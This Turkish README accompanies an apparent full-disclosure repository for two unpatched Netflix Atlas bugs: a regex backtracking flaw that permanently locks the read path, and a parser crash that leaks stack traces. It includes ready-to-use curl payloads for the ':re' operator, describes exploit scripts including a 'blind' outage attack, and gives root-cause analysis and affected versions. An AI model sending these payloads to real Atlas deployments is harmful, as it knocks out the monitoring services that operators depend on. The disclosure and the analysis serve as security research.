# Sekiz yıldır açık: Netflix Atlas'ta tek istekle okuma hattını kilitleyen hata

Tek bir kimliksiz istek, Netflix Atlas kurulumundaki bütün okuma sorgularını 503'e çeviriyor. İstek düzenli ifade taşıyor, `:re` işleci bunu sınırsız değerlendiriyor, tek iş parçacıklı veri aktörü kilitleniyor. Sağlık kontrolü 200 dönmeye devam ettiği için yük dengeleyici trafiği kilitli yere yollamayı sürdürüyor; yazma yolu ayrı olduğu için ölçümler içeri akmaya devam ediyor.

İki ayrı bulgu, iki ayrı rapor:

| Rapor | Konu | Etki |
| --- | --- | --- |
| A-RAPOR.md | `:re` üzerinden sınırsız geri izleme | Okuma hattı 503, kilitlenme |
| B-RAPOR.md | Ayrıştırıcının `{` dalında boş liste çökmesi | 500 ve yığın izi sızıntısı, ayar dosyasında çökme döngüsü |

Bu repoda yama yok. Yalnızca kanıt, ispat kodu ve sömürü betikleri var.

## Sömürü

```bash
curl -sS -N --max-time 60 \
  --get --data-urlencode 'q=name,repro.test,:eq,payload,(a)+(a)+(a)+(a)+b,:re,:and' \
  http://localhost:7106/api/v1/graph

```

Tek istek. Kimlik yok. Yığın yok. Çalıştığı anda aynı yerdeki bütün okumalar 503.

İkinci giriş noktası:

```bash
curl -sS -N 'http://localhost:7106/api/v2/fetch?q=name,f3.test,:eq,payload,(a%2B)%2B(a%2B)%2B(a%2B)%2B(a%2B)%2Bb,:re,:and'

```

Bu sürümde bağlantı açık kalıyor, yalnızca heartbeat paketleri akıyor, sonunda `AskTimeoutException` geliyor. İstemci vazgeçtikten sonra da aktör kilitli kalıyor.

## Betikler

* `exploit/exact-steps.sh`: raporun on adımını sırayla çalıştırır; çıktısı `kanit/exact-steps.log`
* `exploit/blind-outage.sh <seri-sayısı>`: saldırganın veriyi bilmediği senaryo (sha256 benzeri etiket)
* `exploit/outage-scale.sh <seri-sayısı>`: kaç seride 503 başladığını ölçer
* `exploit/measure-live.sh <port> <seri-sayısı>`: ekranda sayaçla canlı ölçüm

Betiklerde varsayılan port 7106; kendi kurulumuna göre değiştir.

## İspat kodu

* `poc/P.java`: kütüphane düzeyi: `PatternMatcher.compile("{2}")` doğrudan çöküyor
* `poc/AtlasPoC.java`: Atlas sorgu ayrıştırıcısı üzerinden aynı hata
* `poc/RedosLive.java`: geri izleme maliyetini ölçer
* `poc/BlindAttack.java`: saldırganın verisini bilmeden çalışan desen
* `poc/HttpPoC.java`: 400 ile 500 ayrımını gösteren asgari sunucu

## Kanıt

* `kanit/exact-steps.log`: adım adım çalıştırmanın çıktısı
* `kanit/dump-after-attack.txt`: saldırı sırasında alınan iş parçacığı dökümü
* `kanit/recovery-after-sustain.log`: saldırı kesildikten sonra bile devam eden kalıcı 503 seyri
* `kanit/mw-200.log`: 200 seri ile ölçüm
* `kanit/atlas-evidence.txt`: 400/500 ayrımı
* `kanit/reg-before.txt`, `kanit/reg-after.txt`: davranış matrisi
* `kanit/video/`: kilitlenme ve toparlanma kayıtları

## Neden 400 değil de 500

`RequestHandler.scala:234-247` yalnızca dört sınıfı 400'e eşliyor: `IllegalArgumentException`, `IllegalStateException`, `JacksonException`, `DateTimeException`. `IndexOutOfBoundsException` bu listede yok, dolayısıyla 500 olarak dışarı çıkıyor.

## Neden sağlık kontrolü yakalamıyor

`/healthcheck` veri aktörüne hiç dokunmuyor. Aktör kilitliyken de 200 dönüyor, yük dengeleyici trafiği göndermeyi sürdürüyor. Yazma yolu ayrı olduğu için ölçümler içeri akmaya devam ediyor; içeri giren veri dışarı çıkmıyor.

## Etkilenen sürümler

```
1.5.3 (2018) -> 1.10.8 (2026-09-23)    hepsi etkileniyor
upstream main (2026-10-23)            hâlâ etkileniyor

```

Bu repo yayınlandığı tarihte bildirilmiş bir kayıt, danışma belgesi, sorun kaydı, değişiklik isteği ya da ispat kodu yoktu.

## Anahtar kelimeler / Keywords

`Netflix Atlas` · `Netflix Spectator` · `Query.scala` · `:re operator` · `PR #1913 incomplete fix` · `StyleExpr.BoundedCharSequence` · `MaxRegexCharReads` · `unbounded regex 0day` · `catastrophic backtracking` · `ReDoS` · `single-request permanent actor deadlock` · `LocalDatabaseActor` · `RoaringTagIndex` · `PatternMatcher` · `Parser.pop` · `IndexOutOfBoundsException` · `CWE-1333` · `CWE-248` · `denial of service` · `metrics service outage`

Yayın tarihi: 2026-10-29. Bu tarihte bu hatalar için bildirilmiş kayıt, danışma belgesi ya da düzeltme yoktu.

